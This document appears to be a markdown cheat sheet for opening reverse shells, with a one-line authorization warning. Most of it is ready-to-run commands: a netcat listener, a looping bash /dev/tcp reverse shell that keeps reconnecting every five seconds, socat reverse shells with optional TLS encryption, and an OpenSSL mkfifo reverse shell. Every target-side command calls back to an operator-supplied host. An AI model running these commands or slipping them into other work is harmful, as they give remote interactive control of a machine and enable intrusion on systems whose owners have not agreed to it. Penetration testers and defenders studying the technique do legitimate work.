# Reverse shell 

> [!WARNING]
> Use reverse shell only on systems that you have explicit authorization to access.

## 1. Using Bash
**Listener** (the machine that wants to establish the ssh connection)
```bash
nc -lvnp <port>
```

From the **target** machine run one of the commands based on the use case.

1. Terminal
```bash
while true; do bash -c "/bin/bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" ; sleep 5 ; done
```

## 2. Socat [Preferred]
Reverse Shell with socat (recommended for stability). Socat is very reliable and supports full TTY and encryption (TLS) if needed.

Installation
```
sudo apt install socat
```

On the **listener**:
```
socat file:`tty`,raw,echo=0 tcp-listen:<port>,reuseaddr
```

On the **target** (your device):
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your-ip>:<port>
```

> [!CAUTION]
> **DO NOT FORGET TO CONFIGURE YOUR FIREWALL TO ACCEPT TRAFFIC ON THE SPECIFIED PORT!"**

### How to add encryption:
**Listener**
```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > fullchain.pem

# Start listener
socat openssl-listen:<port>,reuseaddr,fork,cert=cert.pem,key=key.pem,cafile=cert.pem,verify=0 file:`tty`,raw,echo=0
```

**Target**
```bash
socat openssl-connect:<your-ip>:<port>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

## 4. OpenSSL
A bit more complex but adds encryption.

On the **listener**:
```
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
openssl s_server -quiet -key cert.pem -cert cert.pem -port <port>
```

On the **target**:
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ip>:<port> > /tmp/s
```